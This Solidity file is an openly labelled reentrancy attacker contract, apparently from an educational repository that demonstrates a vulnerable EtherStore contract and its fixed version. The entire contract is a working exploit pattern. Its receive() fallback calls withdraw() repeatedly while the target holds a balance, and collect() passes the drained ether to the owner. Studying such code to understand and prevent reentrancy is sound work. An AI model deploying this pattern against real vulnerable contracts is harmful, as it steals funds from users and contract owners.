// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./FixedContract.sol";

/**@title A sample of Reentrancy Vulnerability
 * @author Belen Iniesta
 * @notice This contract is to force the Reentrancy Attack
 */
contract AttackerFixed {

  EtherStore private fixedContract;
  address private owner;

  constructor(address fixedContractAddress) {
    fixedContract = EtherStore(fixedContractAddress);
    owner = msg.sender;
  }
  
  receive() external payable {
    if (address(fixedContract).balance >= msg.value) {
      fixedContract.withdraw();
    }
  }

  function attack() external payable {
    require(msg.sender == owner);
    fixedContract.deposit{value: msg.value}();
    fixedContract.withdraw();
  }

  function collect() external {
    require(msg.sender == owner);
    payable(msg.sender).transfer(address(this).balance);
  }
}